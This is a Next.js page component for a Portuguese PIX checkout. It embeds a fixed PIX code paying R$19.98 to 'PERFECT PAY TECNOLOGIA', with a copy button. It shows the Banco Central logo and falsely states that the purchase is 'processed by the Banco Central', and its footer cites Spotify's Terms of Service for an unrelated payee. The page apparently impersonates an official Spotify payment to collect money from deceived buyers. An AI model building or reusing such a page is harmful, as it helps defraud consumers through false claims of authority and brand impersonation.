import Image from "next/image";
import Logo from '@/assets/pix-banco-central-svg.png'
import { QrCode } from "./qrcode";

export default function PayPage() {
  return (
    <div className="w-full relative flex items-center justify-center min-h-screen bg-[#181818] text-white p-5">
      <div className='w-full bg-black rounded-lg p-5 space-y-8'>
        <h2 className="text-3xl font-semibold">Pague com PIX</h2>
        <p className="text-sm">Escaneie o código QR abaixo ou insira a chave PIX no seu app de pagamento.</p>


        <QrCode brCode="00020101021226820014br.gov.bcb.pix2560pix.stone.com.br/pix/v2/4daecac3-7d38-4a1c-95c3-d460f2e46354520400005303986540519.985802BR5925PERFECT PAY TECNOLOGIA SE6014RIO DE JANEIRO62290525a2f0da0719818e1874945ca1363040F12" />

        <div className="w-full flex flex-col items-center justify-center rounded-lg bg-[#181818] p-5 space-y-6">


          <Image src={Logo} width={80} height={20} alt="image" priority />


          <div className="mx-auto w-full border-2 border-[#a8a8a8] max-w-sm rounded-3xl overflow-hidden p-2">
            <p className="whitespace-nowrap text-center text-[#a8a8a8] overflow-hidden">
              00020101021226820014br.gov.bcb.pix2560pix.stone.com.br/pix/v2/4daecac3-7d38-4a1c-95c3-d460f2e46354520400005303986540519.985802BR5925PERFECT PAY TECNOLOGIA SE6014RIO DE JANEIRO62290525a2f0da0719818e1874945ca1363040F12
            </p>
          </div>


          <button className="w-full bg-[#01D661] text-black rounded-3xl h-12 font-semibold flex items-center justify-center">
            Copie o código
          </button>

        </div>


        <p className="text-center text-xs text-[#a8a8a8]">Essa é uma compra segura, criptografada e processada pelo Banco Central.</p>



        <p className="text-center text-xs text-[#a8a8a8] pt-4">
          Este site é protegido pelo reCAPTCHA e está sujeito à <b className="text-[#01d661]">Política de Privacidade</b> e aos <b className="text-[#01d661]">Termos de Serviço do Spotify ®.</b>
        </p>
      </div>
    </div>
  )
}